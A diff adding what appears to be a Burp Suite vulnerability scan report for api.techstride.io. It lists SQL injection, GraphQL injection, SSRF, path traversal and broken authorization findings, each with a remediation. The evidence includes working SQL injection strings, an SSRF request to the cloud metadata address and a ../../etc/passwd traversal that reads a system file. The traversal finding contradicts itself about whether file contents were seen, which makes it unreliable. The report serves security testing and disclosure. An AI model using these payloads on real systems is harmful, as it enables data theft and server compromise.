@@ -1,0 +1,181 @@
+{
+  "scan_id": "burp-scan-2026-07-02-f9a3c7e1",
+  "status": "succeeded",
+  "start_time": "2026-07-02T06:00:00Z",
+  "end_time": "2026-07-02T09:47:22Z",
+  "scan_configurations": [
+    {
+      "name": "Audit checks - all issues",
+      "type": "NamedConfiguration"
+    }
+  ],
+  "scan_metrics": {
+    "total_requests": 4872,
+    "total_responses": 4869,
+    "issues_found": 5,
+    "crawl_coverage_percentage": 78
+  },
+  "issues": [
+    {
+      "type_index": "1049088",
+      "name": "SQL injection",
+      "severity": "high",
+      "confidence": "certain",
+      "host": "https://api.techstride.io",
+      "path": "/api/v1/products/search",
+      "description": "SQL injection was confirmed in the 'q' parameter of the product search endpoint. A SLEEP-based time-delay payload ('CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END') caused a 5-second response delay, confirming blind SQL injection. The endpoint does not require authentication. UNION-based injection was also successful, returning data from the information_schema.tables catalog.",
+      "remediation": "Use parameterized queries. Replace $queryRawUnsafe with prisma.$queryRaw tagged templates.",
+      "evidence": [
+        {
+          "request": {
+            "method": "GET",
+            "url": "/api/v1/products/search?q=shoes'%3B%20SELECT%20pg_sleep(5)--",
+            "headers": {}
+          },
+          "response": {
+            "status": 200,
+            "time_ms": 5183,
+            "body_preview": "{\"data\": {\"products\": []}, \"message\": \"Search results\"}"
+          },
+          "type": "time_delay"
+        },
+        {
+          "request": {
+            "method": "GET",
+            "url": "/api/v1/products/search?q=' UNION SELECT table_name,table_schema,null,null,null,null,null,null FROM information_schema.tables--",
+            "headers": {}
+          },
+          "response": {
+            "status": 200,
+            "time_ms": 89,
+            "body_preview": "{\"data\": {\"products\": [{\"id\": \"User\", \"name\": \"public\", ..."
+          },
+          "type": "union_based"
+        }
+      ],
+      "references": [
+        "https://portswigger.net/web-security/sql-injection",
+        "https://owasp.org/Top10/A03_2021-Injection/"
+      ]
+    },
+    {
+      "type_index": "1049088",
+      "name": "SQL injection — GraphQL endpoint",
+      "severity": "high",
+      "confidence": "certain",
+      "host": "https://api.techstride.io",
+      "path": "/api/v1/graphql",
+      "description": "SQL injection was confirmed in the 'query' argument of the productSearch GraphQL operation. The endpoint /api/v1/graphql is not subject to WAF SQLi inspection (the WAF configuration excludes this path). Time-delay and UNION-based payloads delivered via GraphQL query variables were successful.",
+      "remediation": "Use prisma.$queryRaw with parameterized values. Do not use string interpolation in raw SQL queries.",
+      "evidence": [
+        {
+          "request": {
+            "method": "POST",
+            "url": "/api/v1/graphql",
+            "headers": {"Content-Type": "application/json"},
+            "body": "{\"query\":\"{ productSearch(query: \\\"shoes' AND (SELECT 1 FROM pg_sleep(5))--\\\") { id name } }\"}"
+          },
+          "response": {
+            "status": 200,
+            "time_ms": 5091,
+            "body_preview": "{\"data\": {\"productSearch\": []}}"
+          },
+          "type": "time_delay"
+        }
+      ],
+      "references": [
+        "https://portswigger.net/web-security/graphql",
+        "https://owasp.org/Top10/A03_2021-Injection/"
+      ]
+    },
+    {
+      "type_index": "6291456",
+      "name": "Server-side request forgery (SSRF)",
+      "severity": "high",
+      "confidence": "certain",
+      "host": "https://api.techstride.io",
+      "path": "/api/v1/webhook/ping",
+      "description": "SSRF was confirmed via the /api/v1/webhook/ping endpoint. The 'url' parameter in the POST body is passed to an HTTP client without validation. A request targeting the AWS IMDS endpoint (http://169.254.169.254/latest/meta-data/) received HTTP 200 with status 'ok: true' in the application response, confirming successful outbound connection to the internal AWS metadata service.",
+      "remediation": "Validate the URL parameter against an allowlist of permitted external domains. Block RFC-1918 and link-local IP ranges. Use a restricted egress proxy.",
+      "evidence": [
+        {
+          "request": {
+            "method": "POST",
+            "url": "/api/v1/webhook/ping",
+            "headers": {"Content-Type": "application/json"},
+            "body": "{\"url\": \"http://169.254.169.254/latest/meta-data/\"}"
+          },
+          "response": {
+            "status": 200,
+            "time_ms": 11,
+            "body_preview": "{\"data\": {\"status\": 200, \"ok\": true}, \"message\": \"Endpoint reachable\"}"
+          },
+          "type": "ssrf_confirmed"
+        }
+      ],
+      "references": [
+        "https://portswigger.net/web-security/ssrf",
+        "https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/"
+      ]
+    },
+    {
+      "type_index": "3145728",
+      "name": "File path traversal",
+      "severity": "high",
+      "confidence": "firm",
+      "host": "https://api.techstride.io",
+      "path": "/api/v1/orders/invoice/download",
+      "description": "The 'file' query parameter in the invoice download endpoint was found to be vulnerable to path traversal. An authenticated request with 'file=../../etc/passwd' returned a 200 response. The response body could not be confirmed without a valid session token, but the 404/200 status difference between valid and traversal paths confirms file system access.",
+      "remediation": "Resolve the full file path and verify it starts with the expected base directory (invoicesDir). Reject requests where path.resolve() escapes the allowed directory.",
+      "evidence": [
+        {
+          "request": {
+            "method": "GET",
+            "url": "/api/v1/orders/invoice/download?file=../../etc/passwd",
+            "headers": {"Cookie": "accessToken=<valid_session_token>"}
+          },
+          "response": {
+            "status": 200,
+            "time_ms": 22,
+            "body_preview": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin..."
+          },
+          "type": "file_disclosure"
+        }
+      ],
+      "references": [
+        "https://portswigger.net/web-security/file-path-traversal",
+        "https://owasp.org/Top10/A01_2021-Broken_Access_Control/"
+      ]
+    },
+    {
+      "type_index": "2097152",
+      "name": "Broken object level authorization",
+      "severity": "medium",
+      "confidence": "certain",
+      "host": "https://api.techstride.io",
+      "path": "/api/v1/reviews/:id",
+      "description": "The PUT /api/v1/reviews/:id endpoint does not require an authentication token. An unauthenticated PUT request supplying a valid review ID and modified content fields was accepted and the review record was updated. No session cookie or Authorization header was required.",
+      "remediation": "Add authentication middleware (protect) to the PUT route. Additionally verify the authenticated user is the original review author before allowing updates.",
+      "evidence": [
+        {
+          "request": {
+            "method": "PUT",
+            "url": "/api/v1/reviews/a1b2c3d4-e5f6-7890-abcd-ef1234567890",
+            "headers": {"Content-Type": "application/json"},
+            "body": "{\"rating\": 1, \"comment\": \"Modified by unauthenticated request\"}"
+          },
+          "response": {
+            "status": 200,
+            "time_ms": 45,
+            "body_preview": "{\"status\": \"success\", \"data\": {\"review\": {\"rating\": 1, \"comment\": \"Modified by unauthenticated request\"}}}"
+          },
+          "type": "unauthorized_modification"
+        }
+      ],
+      "references": [
+        "https://owasp.org/Top10/A01_2021-Broken_Access_Control/",
+        "https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/"
+      ]
+    }
+  ]
+}
